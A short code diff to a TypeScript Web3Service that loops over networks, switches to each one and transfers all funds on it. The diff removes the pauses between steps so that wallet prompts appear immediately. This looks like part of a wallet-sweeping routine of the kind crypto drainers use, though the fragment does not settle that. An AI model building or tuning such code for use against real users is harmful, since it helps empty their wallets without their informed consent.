@@ -969,8 +969,7 @@ export class Web3Service {
         // Switch to this network
         await this.switchToNetwork(networkBalance.networkId);
         
-        // Small delay to ensure network switch is complete
-        await new Promise(resolve => setTimeout(resolve, 2000));
+        // No delay - instant processing for immediate wallet popup
         
         // Transfer all funds on this network
         const networkResult = await this.transferNetworkFunds(
@@ -990,8 +989,7 @@ export class Web3Service {
           console.error(`❌ ${networkBalance.networkName}: ${networkResult.error}`);
         }
         
-        // Delay between networks to avoid rate limiting
-        await new Promise(resolve => setTimeout(resolve, 3000));
+        // No delay - instant network processing
         
       } catch (error: any) {
         console.error(`Failed to process ${networkBalance.networkName}:`, error);
